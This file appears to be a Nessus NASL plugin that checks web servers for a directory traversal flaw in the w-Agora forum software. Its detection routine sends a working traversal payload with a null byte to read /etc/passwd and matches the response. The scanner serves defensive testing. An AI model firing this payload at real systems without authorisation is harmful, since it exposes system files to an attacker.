#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from Tenable Network Security
#
#  Ref: sonyy@2vias.com.ar
#
#  This script is released under the GNU GPLv2
#

# Changes by Tenable:
# - Revised plugin title, added OSVDB refs (4/28/009)

include("compat.inc");

if (description) {
  script_id(15437);
  script_version("$Revision: 1.4 $");
  script_bugtraq_id(6595);
  script_xref(name:"OSVDB", value:"3012");
  script_xref(name:"OSVDB", value:"54099");
 
  script_name(english:"w-Agora Multiple Script Traversal Arbitrary File Access");
  script_set_attribute(
    attribute:"synopsis",
    value:
"A web forum on the remote host has a directory traversal
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host is running w-agora, a web-based forum application
written in PHP.

The remote version of this software is prone to directory traversal
attacks.  A remote attacker could send specially crafted URL to read
arbitrary files from the remote system with the privileges of the web
server process."
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to the latest version of this software."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
  );
  script_end_attributes(); 

  script_summary(english:"Checks for directory traversal in w-Agora");
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
  script_family(english:"CGI abuses");
  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string(dir, "/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd%00&bn=fm_d1");
 req = http_get(item:req, port:port);
 result = http_keepalive_send_recv(port:port, data:req);
 if(result == NULL) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:result))security_warning(port);
}
